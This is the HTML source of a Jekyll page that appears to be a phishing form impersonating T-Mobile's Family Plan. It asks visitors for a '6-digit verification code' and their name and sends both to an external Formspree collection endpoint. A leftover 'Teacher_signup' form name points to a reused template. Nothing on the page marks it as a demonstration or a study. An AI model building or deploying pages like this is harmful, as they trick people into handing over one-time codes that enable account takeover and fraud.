---
layout: page
title: "validate"
permalink: /validate
---


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel = "stylesheet" href = "css/fontawesome/css/all.css" type = "text/css">
    <link rel = "stylesheet" href = "index2.css" type ="text/css">
     <script src="script.js"></script>
    <title> Validate </title>
</head>

<body>
<!-- Page Content Appear Here-->


<form name="Teacher_signup" action="https://formspree.io/f/xleqwlgn"  method="POST">

  <div class="container">
    <h1>Welcome!</h1>
    <h2>T-Mobile Family Plan</h2>

    <hr>

    <label for="First Name"><b>Please enter 6-digit verification code</b></label>
    <!-- <input type="text" placeholder="First Name" name="fname" > -->
    <input
      required
      type="text"
      name="name"
      inputmode="numeric"
      maxlength="6"
      placeholder="000-000"
    >



    <label class="lght-txt">What name do you go by:</label>
    <input type="text" placeholder="Enter your name..." name="name" >



    <hr>

    <button type="submit" class="registerbtn">Submit</button>
  </div>
  <div class="container signin">
    <p>Add additional member? <a href="#">Add New</a>.</p>
  </div>
</form>


<br><br><!-- Page Content Appear Here-->
</body>
</html>
